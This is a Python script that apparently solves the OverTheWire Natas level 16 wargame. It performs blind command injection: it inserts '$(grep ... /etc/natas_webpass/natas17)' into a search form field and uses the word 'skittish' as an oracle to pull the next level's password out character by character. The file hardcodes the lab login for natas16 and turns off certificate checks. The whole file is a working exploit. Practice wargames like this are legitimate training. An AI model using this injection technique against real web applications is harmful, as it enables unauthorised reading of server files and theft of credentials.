import requests
import string
import sys
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

password = ""
length = 32
pos = 1
pos_indicator = "^"
valid_chars = string.digits + string.ascii_letters

oracle = "skittish"
url = "http://natas16.natas.labs.overthewire.org/"

while pos < 33:
    for c in valid_chars:
        grep = "$(grep " + pos_indicator + c + " /etc/natas_webpass/natas17)"
        payload="needle=" + grep + oracle + "&submit=Search"

        response = requests.post(url, data=payload, headers=headers, auth=basicAuth, verify=False)
        if 'skittish' not in response.text:
            password += c
            
            sys.stdout.write("\r" + password + c)
            sys.stdout.flush()

            break

        sys.stdout.write("\r" + password + c)
        sys.stdout.flush()
    
    pos += 1
    pos_indicator += '.'

print(response.text)
